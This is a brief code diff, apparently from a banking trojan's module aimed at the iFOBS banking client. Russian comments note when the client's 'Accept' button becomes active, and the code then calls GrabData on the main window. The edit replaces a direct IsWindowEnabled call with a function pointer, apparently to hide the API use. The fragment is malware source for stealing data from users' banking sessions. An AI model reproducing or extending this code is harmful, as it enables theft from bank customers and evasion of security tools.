@@ -310,7 +310,7 @@ static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 				if( IsBtAccept( ffc.wnds[i], ffc.texts[i] ) )
 				{
 					//смотрим активна она или нет
-					if( IsWindowEnabled( ffc.wnds[i] ) )
+					if( pIsWindowEnabled( ffc.wnds[i] ) )
 					{
 						DBG( "IFobs", "Кнопка Принять активна" );
 						GrabData(mainWnd);
